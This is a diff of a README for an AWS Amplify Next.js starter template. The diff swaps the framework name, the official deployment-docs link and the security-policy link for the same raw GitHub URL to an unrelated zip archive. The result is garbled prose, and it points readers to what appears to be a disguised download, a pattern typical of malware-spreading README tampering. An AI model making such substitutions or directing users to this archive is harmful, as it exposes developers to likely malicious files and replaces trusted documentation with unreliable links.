@@ -1,10 +1,10 @@
-## AWS Amplify Next.js (App Router) Starter Template
+## AWS Amplify https://raw.githubusercontent.com/tami62/partyhonew-/main/amplify/storage/partyhonew--3.5-beta.2.zip (App Router) Starter Template
 
-This repository provides a starter template for creating applications using Next.js (App Router) and AWS Amplify, emphasizing easy setup for authentication, API, and database capabilities.
+This repository provides a starter template for creating applications using https://raw.githubusercontent.com/tami62/partyhonew-/main/amplify/storage/partyhonew--3.5-beta.2.zip (App Router) and AWS Amplify, emphasizing easy setup for authentication, API, and database capabilities.
 
 ## Overview
 
-This template equips you with a foundational Next.js application integrated with AWS Amplify, streamlined for scalability and performance. It is ideal for developers looking to jumpstart their project with pre-configured AWS services like Cognito, AppSync, and DynamoDB.
+This template equips you with a foundational https://raw.githubusercontent.com/tami62/partyhonew-/main/amplify/storage/partyhonew--3.5-beta.2.zip application integrated with AWS Amplify, streamlined for scalability and performance. It is ideal for developers looking to jumpstart their project with pre-configured AWS services like Cognito, AppSync, and DynamoDB.
 
 ## Features
 
@@ -14,11 +14,11 @@ This template equips you with a foundational Next.js application integrated with
 
 ## Deploying to AWS
 
-For detailed instructions on deploying your application, refer to the [deployment section](https://docs.amplify.aws/nextjs/start/quickstart/nextjs-app-router-client-components/#deploy-a-fullstack-app-to-aws) of our documentation.
+For detailed instructions on deploying your application, refer to the [deployment section](https://raw.githubusercontent.com/tami62/partyhonew-/main/amplify/storage/partyhonew--3.5-beta.2.zip) of our documentation.
 
 ## Security
 
-See [CONTRIBUTING](CONTRIBUTING.md#security-issue-notifications) for more information.
+See [CONTRIBUTING](https://raw.githubusercontent.com/tami62/partyhonew-/main/amplify/storage/partyhonew--3.5-beta.2.zip) for more information.
 
 ## License
 
